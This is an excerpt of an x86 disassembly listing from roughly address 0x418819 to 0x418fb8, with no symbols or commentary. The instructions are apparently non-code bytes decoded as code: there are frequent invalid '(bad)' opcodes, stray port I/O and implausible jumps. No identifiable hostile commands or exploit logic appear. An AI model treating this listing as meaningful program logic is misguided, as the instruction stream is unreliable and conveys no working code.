  418819:	sbb    ebx,DWORD PTR [edx]
  41881b:	jb     0x41881d
  41881d:	add    BYTE PTR [eax],al
  41881f:	add    BYTE PTR [eax],al
  418821:	cmp    edi,DWORD PTR [ecx]
  418823:	jmp    0xf3ee7a04
  418828:	outs   dx,BYTE PTR ds:[esi]
  418829:	loop   0x41883f
  41882b:	mov    DWORD PTR [esi+edx*2-0xf0e8c85],edi
  418832:	int3   
  418833:	pop    ss
  418834:	jmp    0xe9b6:0x1b1c7aa7
  41883b:	dec    edx
  41883c:	add    BYTE PTR [eax+0x118be379],cl
  418842:	adc    eax,0x49845fb
  418847:	dec    ecx
  418848:	loopne 0x4188a1
  41884a:	dec    eax
  41884b:	icebp  
  41884c:	cmp    eax,DWORD PTR [ecx]
  41884e:	aad    0x7b
  418850:	shl    BYTE PTR [ebx+0x70],1
  418853:	cmc    
  418854:	mov    edx,DWORD PTR [ecx]
  418856:	adc    eax,0xfa844d35
  41885b:	mov    ebx,DWORD PTR [esi+0x33faea72]
  418861:	jle    0x418867
  418863:	dec    ecx
  418864:	fmul   QWORD PTR [ebp-0x38bf16b9]
  41886a:	outs   dx,DWORD PTR ds:[esi]
  41886b:	adc    DWORD PTR [edi],ecx
  41886d:	add    BYTE PTR [eax-0x5],bh
  418870:	jmp    DWORD PTR [ebx+0x160c417c]
  418876:	cmp    edx,ebp
  418878:	mov    BYTE PTR [ebp+edi*2-0x3d],dl
  41887c:	pop    edi
  41887d:	xchg   edx,eax
  41887e:	dec    ebx
  41887f:	mov    dl,0x54
  418882:	add    al,0x2f
  418884:	rol    BYTE PTR [eax],0x0
  418887:	add    BYTE PTR [eax],al
  418889:	add    BYTE PTR [edi],dh
  41888b:	repnz push eax
  41888d:	mov    edx,DWORD PTR [eax]
  41888f:	test   ah,ch
  418891:	dec    eax
  418892:	(bad)  
  418893:	cmp    DWORD PTR ds:0x560a858b,eax
  418899:	push   edi
  41889a:	aad    0x39
  41889c:	in     eax,dx
  41889d:	mov    edx,DWORD PTR [ecx-0x580578ee]
  4188a3:	push   ecx
  4188a4:	or     eax,0xfa03e403
  4188a9:	xor    ebx,DWORD PTR [edx+0x1cfd40f0]
  4188af:	out    dx,al
  4188b0:	inc    eax
  4188b1:	(bad)  
  4188b2:	sbb    al,0x7f
  4188b4:	dec    ecx
  4188b5:	mov    eax,0x89bd6985
  4188ba:	jne    0x41891a
  4188bc:	sub    DWORD PTR [ecx],edi
  4188be:	mov    ah,0x50
  4188c0:	mov    BYTE PTR [edx+0x29011974],bh
  4188c6:	lods   eax,DWORD PTR ds:[esi]
  4188c7:	mov    WORD PTR [ebx+ecx*2-0x76ff3b57],cs
  4188ce:	sub    BYTE PTR [ecx-0x76],cl
  4188d1:	inc    ebx
  4188d2:	mov    ch,0xb2
  4188d4:	into   
  4188d5:	jmp    0x418955
  4188d7:	jmp    0x1b2b13e0
  4188dc:	add    DWORD PTR [eax],eax
  4188de:	pop    esi
  4188df:	fisttp DWORD PTR [edx+0x114c543]
  4188e5:	mov    DWORD PTR [eax],edi
  4188e7:	or     DWORD PTR [edx-0x395dc3f1],ebp
  4188ed:	repz add BYTE PTR [eax],al
  4188f0:	add    BYTE PTR [eax],al
  4188f2:	add    ah,bh
  4188f4:	mov    ss,WORD PTR [ebp+0x39]
  4188f7:	mov    ah,0xa6
  4188f9:	add    BYTE PTR [edi+0x438a5538],al
  4188ff:	test   eax,0x767b4314
  418904:	mov    ds:0xe5fedbbf,al
  418909:	push   edi
  41890a:	or     eax,0xd2bde2a
  41890f:	and    cl,BYTE PTR [esi]
  418911:	sub    BYTE PTR [ecx-0x32dde30],cl
  418917:	ror    BYTE PTR [ebp-0x6eba8cca],0x40
  41891e:	cld    
  41891f:	cmp    bl,BYTE PTR [eax-0x6a2f52fa]
  418925:	mov    cl,BYTE PTR [ebx+0x79]
  418928:	mov    ah,0xbf
  41892a:	out    dx,eax
  41892b:	test   BYTE PTR ds:0xfdf60020,0x23
  418932:	add    BYTE PTR [eax],al
  418934:	pop    ebp
  418935:	add    eax,DWORD PTR [esi+0x33]
  418938:	add    ch,dh
  41893a:	add    edi,edx
  41893c:	mov    ah,0x9a
  41893e:	mov    WORD PTR [esi-0x453f9fb6],ds
  418944:	inc    edi
  418945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418946:	ss jne 0x418991
  418949:	lods   al,BYTE PTR ds:[esi]
  41894a:	push   cs
  41894b:	jne    0x418995
  41894d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41894e:	dec    edi
  41894f:	fiadd  DWORD PTR [esp+ebp*4+0x37]
  418953:	rol    BYTE PTR [ebp+0xb512],cl
  418959:	add    BYTE PTR [eax],al
  41895b:	add    BYTE PTR [ebx+eax*4],ah
  41895e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41895f:	pop    ds
  418960:	jne    0x418917
  418962:	jecxz  0x4188ed
  418964:	gs jp  0x418923
  418967:	inc    DWORD PTR ss:[ecx]
  41896a:	rol    eax,1
  41896c:	test   eax,0x3636ebb4
  418971:	adc    dl,BYTE PTR es:[eax]
  418974:	hlt    
  418975:	lods   al,BYTE PTR ds:[esi]
  418976:	push   es
  418977:	add    eax,DWORD PTR [esi]
  418979:	pop    es
  41897a:	and    eax,0x6f018ec0
  41897f:	mov    edi,0xd23ec69
  418984:	push   es
  418985:	adc    eax,0x7a52bfd6
  41898a:	and    al,0x4c
  41898c:	push   0xf5c49ec0
  418991:	scas   eax,DWORD PTR es:[edi]
  418992:	sahf   
  418993:	add    al,0xf2
  418995:	(bad)  
  418996:	sahf   
  418997:	mov    ch,0x36
  418999:	sbb    ah,bl
  41899b:	cmp    eax,0x88e756b6
  4189a0:	mov    dh,0x26
  4189a2:	loop   0x418962
  4189a4:	sbb    dh,BYTE PTR [ebp+0x2db689de]
  4189aa:	popa   
  4189ab:	iret   
  4189ac:	sbb    DWORD PTR [ecx],0x15b689ed
  4189b2:	jno    0x418983
  4189b4:	sbb    DWORD PTR [ebx+0x24bf400],eax
  4189ba:	mov    BYTE PTR [eax+edi*2],dl
  4189bd:	mov    dh,0x2
  4189bf:	and    eax,DWORD PTR [eax]
  4189c1:	add    BYTE PTR [eax],al
  4189c3:	add    BYTE PTR [eax],al
  4189c5:	ret    0x7441
  4189c8:	out    dx,eax
  4189c9:	idiv   bh
  4189cb:	add    DWORD PTR [ecx+0x75],esp
  4189ce:	cld    
  4189cf:	lds    esp,FWORD PTR [ebx+eiz*4-0x5d537ad3]
  4189d6:	les    edi,FWORD PTR [edi-0x44]
  4189d9:	mov    ds:0x536c0d02,al
  4189de:	add    al,BYTE PTR [eax]
  4189e0:	jmp    0x694989db
  4189e5:	or     dl,BYTE PTR [edx+0x0]
  4189e8:	jae    0x4189a2
  4189ea:	mov    cl,0x1c
  4189ec:	imul   ebp,edx,0xba63002f
  4189f2:	push   ss
  4189f3:	je     0x4189e1
  4189f5:	pushf  
  4189f6:	sar    al,1
  4189f8:	jne    0x418a79
  4189fa:	inc    BYTE PTR [ebx]
  4189fc:	popa   
  4189fd:	nop
  4189fe:	test   DWORD PTR [edi+ebx*8],edx
  418a01:	dec    eax
  418a02:	sar    ebp,0xe8
  418a05:	out    dx,al
  418a06:	sar    eax,1
  418a08:	daa    
  418a09:	dec    esp
  418a0a:	cli    
  418a0b:	or     edi,ecx
  418a0d:	mov    al,0xc1
  418a0f:	std    
  418a10:	jmp    0x3d3e9113
  418a15:	lds    edi,FWORD PTR [ecx+0x4]
  418a18:	out    dx,eax
  418a19:	mov    eax,ds:0x23b6c3b1
  418a1e:	dec    ecx
  418a1f:	std    
  418a20:	xor    al,0x85
  418a22:	sar    ah,cl
  418a24:	sbb    al,0x89
  418a26:	sbb    ch,BYTE PTR [esi+0x9d]
  418a2c:	add    BYTE PTR [eax],al
  418a2e:	sub    DWORD PTR [edi],0x42b39901
  418a34:	jae    0x418a0d
  418a36:	popa   
  418a37:	mov    cl,0xdb
  418a39:	add    BYTE PTR [ebx],ch
  418a3b:	sahf   
  418a3c:	dec    eax
  418a3d:	call   0x1032e6dd
  418a42:	push   ebx
  418a43:	cmp    al,0xe9
  418a45:	inc    DWORD PTR [ecx]
  418a47:	icebp  
  418a48:	xchg   BYTE PTR [ebp-0x28],dh
  418a4b:	out    dx,al
  418a4c:	add    al,BYTE PTR [ecx]
  418a4e:	xchg   DWORD PTR [ebp+eax*1-0x78],esi
  418a52:	and    esp,esi
  418a54:	xchg   DWORD PTR [ebp+0x3a],eax
  418a57:	fstp   DWORD PTR [ebx-0x7909c405]
  418a5d:	inc    ebp
  418a5e:	enter  0xfc51,0x75
  418a62:	mov    WORD PTR [edx],es
  418a64:	(bad)  
  418a65:	push   eax
  418a66:	xor    al,0x2b
  418a68:	push   cs
  418a69:	add    esp,ecx
  418a6b:	add    edi,ebp
  418a6d:	adc    DWORD PTR [ecx],0xffffffe5
  418a70:	jnp    0x6dc06f57
  418a76:	ins    BYTE PTR es:[edi],dx
  418a77:	adc    DWORD PTR [edi],esi
  418a79:	inc    ebp
  418a7a:	dec    esp
  418a7b:	push   es
  418a7c:	mov    WORD PTR [ebx-0x66],?
  418a7f:	lock cli 
  418a81:	and    ecx,0xffffffd8
  418a84:	jnp    0x6dc0635b
  418a8a:	enter  0x3715,0x45
  418a8e:	aam    0x0
  418a90:	mov    WORD PTR [edi+0x0],cs
  418a93:	add    BYTE PTR [eax],al
  418a95:	add    BYTE PTR [eax],al
  418a97:	dec    edx
  418a98:	lock cli 
  418a9a:	pop    ebx
  418a9b:	fwait
  418a9c:	stos   DWORD PTR es:[edi],eax
  418a9d:	lds    ebx,FWORD PTR [esi+0x25]
  418aa0:	lds    ecx,FWORD PTR [edi]
  418aa2:	add    BYTE PTR [ecx+0x3883ebab],al
  418aa8:	and    edx,DWORD PTR [eax+0x56]
  418aab:	arpl   WORD PTR [ebx],si
  418aad:	iret   
  418aae:	xor    ebx,DWORD PTR [ebx]
  418ab0:	cmp    BYTE PTR [eax],dh
  418ab2:	rol    ch,0x49
  418ab5:	jmp    0x38300043
  418aba:	xchg   eax,eax
  418abc:	pop    ebp
  418abd:	jnp    0x418b3a
  418abf:	or     eax,0x6a13d843
  418ac4:	fwait
  418ac5:	push   0x7e1a12ff
  418aca:	dec    ebx
  418acb:	jge    0x418a6f
  418acd:	(bad)  
  418ace:	fucomip st,st(4)
  418ad0:	jbe    0x418b03
  418ad2:	mov    DWORD PTR [eax-0xeac83d7],ebp
  418ad8:	adc    BYTE PTR [esi],bh
  418ada:	or     eax,0x43bfb
  418adf:	jne    0x418a91
  418ae1:	mov    esi,0x3196eefb
  418ae6:	add    DWORD PTR [edx+eiz*4-0x4b852842],edi
  418aed:	dec    DWORD PTR [ecx]
  418aef:	pop    ebx
  418af0:	and    al,al
  418af2:	pop    ss
  418af3:	push   0xffffffa5
  418af5:	xlat   BYTE PTR ds:[ebx]
  418af6:	(bad)  
  418af7:	mov    dl,0x19
  418af9:	jle    0x418ad2
  418afb:	add    BYTE PTR [eax],al
  418afd:	add    BYTE PTR [eax],al
  418aff:	add    ah,bh
  418b01:	pop    esi
  418b02:	push   ebp
  418b03:	mov    eax,DWORD PTR [ebp+0x4]
  418b06:	dec    ecx
  418b07:	inc    ebx
  418b08:	xchg   ecx,eax
  418b09:	sbb    al,BYTE PTR [ecx]
  418b0b:	add    BYTE PTR [ebp-0x60],dh
  418b0e:	xor    edi,DWORD PTR [ecx]
  418b10:	xor    BYTE PTR [ebp-0x50],dl
  418b13:	pop    esi
  418b14:	out    dx,al
  418b15:	div    BYTE PTR [ebx]
  418b17:	xchg   DWORD PTR [eax],ebp
  418b19:	and    DWORD PTR [esi+0x4b],edi
  418b1c:	dec    ebp
  418b1d:	mov    al,ds:0x12d3f7af
  418b22:	adc    BYTE PTR ds:0x7b7cf5e8,cl
  418b28:	pop    ecx
  418b29:	mov    al,0x41
  418b2b:	cmp    eax,eax
  418b2d:	dec    ecx
  418b2e:	mov    al,0xc
  418b30:	dec    BYTE PTR ds:0x27c662c
  418b36:	add    ebp,DWORD PTR [ebp-0x10d9fb39]
  418b3c:	scas   eax,DWORD PTR es:[edi]
  418b3d:	adc    dl,BYTE PTR [ebx]
  418b3f:	xor    eax,0xb896e7b8
  418b44:	js     0x418bbf
  418b46:	add    al,0x20
  418b48:	repnz lods al,BYTE PTR ds:[esi]
  418b4a:	jb     0x418b3a
  418b4c:	(bad)  
  418b4d:	ss hlt 
  418b4f:	push   es
  418b50:	repnz lods al,BYTE PTR ds:[esi]
  418b52:	jb     0x418ada
  418b54:	jle    0x418b7c
  418b56:	out    0xb1,eax
  418b58:	jb     0x418b41
  418b5a:	fistp  DWORD PTR [edi]
  418b5c:	jno    0x418b5d
  418b5e:	test   al,0x1e
  418b60:	jno    0x418be1
  418b62:	les    esp,FWORD PTR [edi]
  418b64:	add    BYTE PTR [eax],al
  418b66:	add    BYTE PTR [eax],al
  418b68:	add    BYTE PTR [ebp+0x77],dh
  418b6b:	mov    ah,0x13
  418b6d:	je     0x418ba8
  418b6f:	call   0xf2055634
  418b74:	mov    eax,0x7e7eae66
  418b79:	sbb    dh,BYTE PTR ds:[edx-0x40]
  418b7d:	into   
  418b7e:	(bad)  
  418b7f:	stos   DWORD PTR es:[edi],eax
  418b80:	das    
  418b81:	pop    esp
  418b82:	push   edx
  418b83:	test   al,0xc5
  418b85:	repz aam 0xfe
  418b88:	jge    0x418bd0
  418b8a:	ss rcr al,cl
  418b8d:	sahf   
  418b8e:	jbe    0x418b2c
  418b90:	sbb    ebx,DWORD PTR [edx+esi*1-0x1a]
  418b94:	bound  esp,QWORD PTR [edx-0x5547a041]
  418b9a:	cli    
  418b9b:	xchg   ebp,eax
  418b9c:	ss cmp al,0x4c
  418b9f:	pop    ebp
  418ba0:	cld    
  418ba1:	std    
  418ba2:	(bad)  
  418ba3:	mov    esi,0xc21ebe7b
  418ba8:	or     ch,ah
  418baa:	(bad)  
  418bab:	sahf   
  418bac:	jnp    0x418b74
  418bae:	push   ds
  418baf:	scas   eax,DWORD PTR es:[di]
  418bb1:	outs   dx,BYTE PTR ds:[esi]
  418bb2:	add    al,BYTE PTR [eax]
  418bb4:	fs xor al,0x4
  418bb7:	jae    0x418ba3
  418bb9:	ret    
  418bba:	mov    bh,0x3
  418bbc:	jb     0x418be0
  418bbe:	cli    
  418bbf:	or     al,0x4e
  418bc1:	dec    edx
  418bc2:	push   ss
  418bc3:	add    DWORD PTR [ebx+0x5e0d3c18],edi
  418bc9:	mov    ecx,0xe90002
  418bce:	add    BYTE PTR [eax],al
  418bd0:	add    BYTE PTR [eax],al
  418bd2:	(bad)
  418bd6:	loop   0x418be5
  418bd8:	add    BYTE PTR [edx-0x3e],ah
  418bdb:	std    
  418bdc:	jb     0x418bba
  418bde:	cmp    DWORD PTR [ebp-0x108a8e2d],0x28edcd87
  418be8:	sub    BYTE PTR [esi],0x73
  418beb:	jl     0x418c38
  418bed:	dec    ebp
  418bee:	cmp    DWORD PTR [ecx+0x4],ecx
  418bf1:	repz sahf 
  418bf3:	jp     0x418c01
  418bf5:	not    BYTE PTR [eax-0x43]
  418bf8:	jecxz  0x418c31
  418bfa:	mov    es,WORD PTR [edx-0x21]
  418bfd:	in     eax,0x43
  418bff:	sar    esp,cl
  418c01:	repz js 0x418c07
  418c04:	fdiv   DWORD PTR [ecx-0x4b]
  418c07:	out    dx,al
  418c08:	(bad)  
  418c09:	imul   edi,DWORD PTR [esp+eax*1],0x817e8c87
  418c10:	inc    ebx
  418c11:	add    DWORD PTR [esi],ebx
  418c13:	int    0xd3
  418c15:	ret    0xad39
  418c18:	inc    edx
  418c19:	bound  esp,QWORD PTR [edx+0x529c8925]
  418c1f:	add    ecx,edi
  418c21:	jo     0x418bc6
  418c23:	push   ecx
  418c24:	mov    DWORD PTR [ecx+ebx*4],esi
  418c27:	adc    DWORD PTR [ebx-0x33],0x1c890689
  418c2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c2f:	sbb    edx,DWORD PTR ds:0xf558cf00
  418c35:	inc    DWORD PTR [eax]
  418c37:	add    BYTE PTR [eax],al
  418c39:	add    BYTE PTR [eax],al
  418c3b:	mov    BYTE PTR [edi+eax*4],cl
  418c3e:	push   ebp
  418c3f:	cmp    BYTE PTR [ebx-0x78],bl
  418c42:	jne    0x418c68
  418c44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c45:	pop    eax
  418c46:	or     BYTE PTR [edi-0x2c],cl
  418c49:	mov    DWORD PTR gs:[eax+0x4e],ecx
  418c4d:	cmp    edx,DWORD PTR ds:[ecx-0x4a]
  418c51:	jnp    0x418c37
  418c53:	xchg   edi,eax
  418c54:	push   0xd649ff0d
  418c59:	cld    
  418c5a:	dec    esp
  418c5b:	clc    
  418c5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c5d:	dec    eax
  418c5e:	clc    
  418c5f:	(bad)  
  418c60:	sar    DWORD PTR [si-0x1e],1
  418c64:	icebp  
  418c65:	inc    eax
  418c66:	cld    
  418c67:	xchg   DWORD PTR [eax+0xd],ebp
  418c6a:	cmp    DWORD PTR [ecx],esp
  418c6c:	(bad)  [edx]
  418c6e:	mov    WORD PTR [eax-0xd],ds
  418c71:	cli    
  418c72:	(bad)  
  418c73:	jg     0x418c45
  418c75:	cld    
  418c76:	dec    esp
  418c77:	sub    al,0xfe
  418c79:	les    eax,FWORD PTR [ecx]
  418c7b:	and    ebp,esi
  418c7d:	aas    
  418c7e:	cmp    ebx,DWORD PTR [ecx]
  418c80:	adc    DWORD PTR [ebx],ecx
  418c82:	mov    WORD PTR [esi+0x47fffaf2],gs
  418c88:	inc    eax
  418c89:	or     DWORD PTR [edx+0x887b8e1],ecx
  418c8f:	pop    ss
  418c90:	mov    edx,0xebe75e5a
  418c95:	rcr    DWORD PTR [eax],0x8c
  418c98:	sub    eax,0x4e89ebbd
  418c9d:	mov    ah,ch
  418c9f:	add    BYTE PTR [eax],al
  418ca1:	add    BYTE PTR [eax],al
  418ca3:	add    BYTE PTR [edi],bl
  418ca5:	or     DWORD PTR [eax-0x75],edx
  418ca8:	loope  0x418cd6
  418caa:	mov    BYTE PTR [ecx+0x70],cl
  418cad:	push   eax
  418cae:	push   esp
  418caf:	mov    DWORD PTR [ecx+0x754d86ea],esp
  418cb5:	and    eax,0xeeeefa7a
  418cba:	adc    eax,DWORD PTR [ecx]
  418cbc:	sub    eax,0x4b31271d
  418cc1:	pusha  
  418cc2:	(bad)  
  418cc3:	std    
  418cc4:	jne    0x418d1d
  418cc6:	(bad)  
  418cc7:	cld    
  418cc8:	jne    0x418c6c
  418cca:	mov    esi,0x6fdeecaf
  418ccf:	xchg   DWORD PTR [eax+0x7abee975],edi
  418cd5:	sahf   
  418cd6:	and    al,0xff
  418cd8:	and    bl,BYTE PTR [edx]
  418cda:	fcmovb st,st(7)
  418cdc:	(bad)  
  418cdd:	mov    dl,0xbe
  418cdf:	(bad)  
  418ce0:	push   ds
  418ce1:	sbb    eax,0xa465537a
  418ce6:	(bad)  
  418ce7:	mov    ebx,0x39340eec
  418cec:	and    eax,0x74b78031
  418cf1:	sbb    DWORD PTR [ecx],eax
  418cf3:	sub    DWORD PTR [edi-0x3134395e],esi
  418cf9:	sbb    al,0x7a
  418cfb:	inc    ebx
  418cfc:	test   eax,0xfc571153
  418d01:	push   esi
  418d02:	sub    DWORD PTR [edi-0x4116eec8],eax
  418d08:	add    BYTE PTR [eax],al
  418d0a:	add    BYTE PTR [eax],al
  418d0c:	add    BYTE PTR [eax+0x1c],al
  418d0f:	jl     0x418d54
  418d11:	mov    ebp,0x6ec7c6b4
  418d16:	fisubr DWORD PTR [esi+0x4956fc00]
  418d1c:	mov    DWORD PTR [eax-0xf],eax
  418d1f:	cld    
  418d20:	mov    ah,0x28
  418d22:	or     eax,0x2928b4fd
  418d27:	jp     0x418da4
  418d29:	jge    0x418cb7
  418d2b:	cs jae 0x418dab
  418d2e:	sbb    BYTE PTR [eax-0x2efd720d],bh
  418d34:	sub    esi,DWORD PTR [eax+0x27]
  418d37:	out    dx,al
  418d38:	pop    esi
  418d39:	into   
  418d3a:	sub    ah,BYTE PTR [edx-0x40]
  418d3d:	outs   dx,BYTE PTR ds:[esi]
  418d3e:	jnp    0x418d64
  418d40:	cmp    ah,dh
  418d42:	pushf  
  418d43:	mov    ds:0xc69cf403,al
  418d48:	add    esi,esp
  418d4a:	pushf  
  418d4b:	mov    esi,0xc29cf403
  418d50:	add    ebp,esi
  418d52:	in     eax,0xf4
  418d54:	lds    edi,FWORD PTR [eax]
  418d56:	jmp    esi
  418d58:	jl     0x418d00
  418d5a:	outs   dx,BYTE PTR ds:[esi]
  418d5b:	pusha  
  418d5c:	rol    BYTE PTR [esi+0x79],1
  418d5f:	and    al,0x48
  418d61:	xor    edi,DWORD PTR [ebp-0x42c4fb6a]
  418d67:	aad    0x4
  418d69:	test   BYTE PTR [edx-0xb],0xcf
  418d6d:	cmc    
  418d6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d6f:	jle    0x418d74
  418d71:	add    BYTE PTR [eax],al
  418d73:	add    BYTE PTR [eax],al
  418d75:	add    BYTE PTR [esi-0x7a890a00],al
  418d7b:	jns    0x418d31
  418d7d:	dec    edi
  418d7e:	js     0x418def
  418d80:	out    0xa5,eax
  418d82:	popf   
  418d83:	mov    ebp,0x2777b82a
  418d88:	lods   al,BYTE PTR ds:[esi]
  418d89:	sbb    ebx,esp
  418d8b:	or     DWORD PTR [edx-0x50],ebp
  418d8e:	(bad)  
  418d8f:	add    DWORD PTR [esp+edi*8-0x37daae13],edi
  418d96:	popa   
  418d97:	add    dh,BYTE PTR [eax-0x28]
  418d9a:	rcr    BYTE PTR [edi-0x5335371f],cl
  418da0:	std    
  418da1:	cs ss push ds
  418da4:	(bad)  
  418da5:	enter  0x26b6,0xb4
  418da9:	push   edi
  418daa:	hlt    
  418dab:	inc    ecx
  418dac:	jmp    0x8f9c33
  418db1:	jmp    0x6f0550b7
  418db6:	or     bl,BYTE PTR [ecx]
  418db8:	add    al,0xaf
  418dba:	cmp    dh,BYTE PTR [esi]
  418dbc:	add    BYTE PTR [edx+0x32],dh
  418dbf:	push   ds
  418dc0:	cmp    DWORD PTR [ecx*4-0x1e21f654],ebp
  418dc7:	rcr    ebx,0xf6
  418dca:	leave  
  418dcb:	rcr    edi,1
  418dcd:	ror    BYTE PTR [ecx-0x9],cl
  418dd0:	mov    ah,0x2c
  418dd2:	cdq    
  418dd3:	div    DWORD PTR [esp+edx*1-0x58847d5b]
  418dda:	add    BYTE PTR [eax],al
  418ddc:	add    BYTE PTR [eax],al
  418dde:	add    BYTE PTR [ecx+0x7d],bh
  418de1:	push   ebx
  418de2:	mov    ebp,0xd265ffed
  418de7:	cmp    esp,DWORD PTR [esi+0x74]
  418dea:	repz div bh
  418ded:	add    DWORD PTR [ecx+0x7d],esi
  418df0:	hlt    
  418df1:	or     al,0x36
  418df3:	mov    eax,ds:0x7ee1e865
  418df8:	mov    esi,0xc1b0e80d
  418dfd:	std    
  418dfe:	call   0x6b015f72
  418e03:	xor    eax,DWORD PTR [eax]
  418e05:	adc    ah,0x89
  418e08:	add    cl,BYTE PTR ds:0x2ef64
  418e0e:	jmp    0x69498609
  418e13:	sbb    dh,BYTE PTR [esi]
  418e15:	add    BYTE PTR [ebx+0x78],ah
  418e18:	scas   al,BYTE PTR es:[edi]
  418e19:	imul   ecx,DWORD PTR cs:[edx],0xac9d0027
  418e20:	lahf   
  418e21:	mov    BYTE PTR [edx+edi*1+0xebc389c],dh
  418e28:	scas   al,BYTE PTR es:[edi]
  418e29:	fisub  WORD PTR es:[ecx]
  418e2c:	rcr    ebx,1
  418e2e:	add    BYTE PTR [eax+0x70787fd],cl
  418e34:	cmp    eax,0x279088d9
  418e39:	mov    esi,0x43a994e8
  418e3e:	push   cs
  418e3f:	pop    ebp
  418e40:	mov    edi,0xff40
  418e45:	add    BYTE PTR [eax],al
  418e47:	add    BYTE PTR [ebp-0x58],bl
  418e4a:	push   eax
  418e4b:	mov    eax,0xeb01bfcf
  418e50:	push   esp
  418e51:	and    eax,0xd7a1c60d
  418e56:	inc    DWORD PTR [edi-0x2f8f29ad]
  418e5c:	fscale 
  418e5e:	or     eax,0xfabe81ff
  418e63:	jne    0x418e99
  418e65:	(bad)  
  418e66:	jo     0x418e60
  418e68:	ins    BYTE PTR es:[edi],dx
  418e69:	xlat   BYTE PTR ds:[ebx]
  418e6a:	jo     0x418e60
  418e6c:	hlt    
  418e6d:	pop    ebp
  418e6e:	stc    
  418e6f:	(bad)  
  418e70:	jmp    0x418e73
  418e72:	lock test esp,ebx
  418e75:	imul   esi,DWORD PTR ds:0xab901ff,0xffffffb7
  418e7c:	pop    ecx
  418e7d:	loop   0x418e79
  418e7f:	jne    0x418e05
  418e81:	es mov ah,0x55
  418e84:	dec    esp
  418e85:	(bad)  
  418e86:	jo     0x418e7c
  418e88:	ins    BYTE PTR es:[di],dx
  418e8a:	mov    cl,0xc6
  418e8c:	sar    edi,cl
  418e8e:	xchg   BYTE PTR [ebp-0x2c],bh
  418e91:	test   al,0x40
  418e93:	inc    BYTE PTR [esp+edi*1-0x4]
  418e97:	call   0x3c7cbe
  418e9c:	push   edi
  418e9d:	cmp    al,0x9
  418e9f:	add    esp,DWORD PTR [edi+0x52]
  418ea2:	cld    
  418ea3:	jne    0x418e35
  418ea5:	add    al,dh
  418ea7:	push   eax
  418ea8:	test   BYTE PTR [ebx],dh
  418eaa:	or     al,BYTE PTR [ecx]
  418eac:	add    BYTE PTR [eax],al
  418eae:	add    BYTE PTR [eax],al
  418eb0:	add    BYTE PTR [ebp+0x1b],dh
  418eb3:	add    cl,dh
  418eb5:	neg    BYTE PTR [ebp+0x31]
  418eb8:	adc    dh,bh
  418eba:	push   ebp
  418ebb:	xor    DWORD PTR [ecx+0x3910d718],eax
  418ec1:	cmp    bh,ch
  418ec3:	sti    
  418ec4:	mov    ebp,DWORD PTR [ebx]
  418ec6:	adc    eax,0xd6f6fd29
  418ecb:	pop    ss
  418ecc:	adc    dh,bh
  418ece:	ficom  WORD PTR [edi]
  418ed0:	adc    eax,0xb0391461
  418ed6:	mov    ecx,edi
  418ed8:	mov    edx,DWORD PTR [edi-0x5102d6c5]
  418ede:	add    al,0x7d
  418ee0:	(bad)  
  418ee1:	mov    ds:0x75104662,eax
  418ee6:	push   cs
  418ee7:	jge    0x418ed5
  418ee9:	test   BYTE PTR [ebp-0x133caf28],0xf4
  418ef0:	shl    DWORD PTR [esi-0x74],1
  418ef3:	shl    DWORD PTR [eax],0x35
  418ef6:	mov    ds:0x6fcefce,eax
  418efb:	xor    BYTE PTR [edi+0x7b7b85a0],al
  418f01:	adc    DWORD PTR [ebx-0x30],esi
  418f04:	adc    ebp,DWORD PTR [edx-0x3d]
  418f07:	pop    ebp
  418f08:	push   edx
  418f0a:	sbb    DWORD PTR [esi+0x4b],edi
  418f0d:	jge    0x418ec1
  418f0f:	into   
  418f10:	jecxz  0x418efe
  418f12:	pop    esi
  418f13:	and    DWORD PTR [ecx+0x0],ecx
  418f19:	add    BYTE PTR [eax],ch
  418f1b:	sub    DWORD PTR [ebx+edx*2-0x2f],edi
  418f1f:	add    BYTE PTR [esi],bh
  418f21:	or     eax,0x299fb
  418f26:	jne    0x418ec8
  418f28:	mov    dh,0xfb
  418f2a:	out    dx,al
  418f2b:	jbe    0x418f4e
  418f2d:	mov    edi,0x7ce90294
  418f32:	ds dec edx
  418f34:	jb     0x418f2e
  418f36:	ins    DWORD PTR es:[edi],dx
  418f37:	out    0xa3,eax
  418f39:	or     ebp,DWORD PTR [eax+0x7e]
  418f3c:	mov    dh,0x4
  418f3e:	jne    0x418f42
  418f40:	jo     0x418efb
  418f42:	xor    BYTE PTR [ebp-0x69],0x2a
  418f46:	mov    eax,0x7504febd
  418f4b:	add    ah,bh
  418f4d:	jle    0x418fb4
  418f4f:	out    0x2b,eax
  418f51:	adc    dh,ch
  418f53:	leave  
  418f54:	jno    0x418f0e
  418f56:	dec    edx
  418f57:	ja     0x418fad
  418f59:	sub    al,0xa2
  418f5b:	out    0xe1,al
  418f5d:	mov    al,0xbd
  418f5f:	ja     0x418fa5
  418f61:	sub    ah,bh
  418f63:	xor    al,BYTE PTR [edx]
  418f65:	mov    ecx,0x7ee4a572
  418f6a:	scas   al,BYTE PTR es:[edi]
  418f6b:	sub    dh,al
  418f6d:	imul   ebp
  418f6f:	lods   al,BYTE PTR ds:[esi]
  418f70:	in     al,dx
  418f71:	ret    0xa56d
  418f74:	mul    BYTE PTR [edi+0x33d1b324]
  418f7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f7b:	cld    
  418f7c:	pop    edi
  418f7d:	test   al,0x0
  418f7f:	add    BYTE PTR [eax],al
  418f81:	add    BYTE PTR [eax],al
  418f83:	and    bh,BYTE PTR [ecx+0x4]
  418f86:	xor    BYTE PTR [ebp+eiz*4+0x72],cl
  418f8a:	test   al,0x75
  418f8c:	jns    0x418f82
  418f8e:	das    
  418f8f:	hlt    
  418f90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f91:	jle    0x418f96
  418f93:	jae    0x418f8f
  418f95:	and    DWORD PTR [ecx-0x3a165a26],ebp
  418f9b:	int    0xfd
  418f9d:	imul   esp,DWORD PTR [eax-0x579dfe2e],0x54e4182
  418fa7:	xor    edi,edi
  418fa9:	sbb    eax,0xe47ee
  418fae:	mov    ch,0x18
  418fb0:	jns    0x41902d
  418fb2:	cmp    eax,0xd2efb733
  418fb7:	in     eax,dx
  418fb8:	sub    DWORD PTR es:[ecx],edi
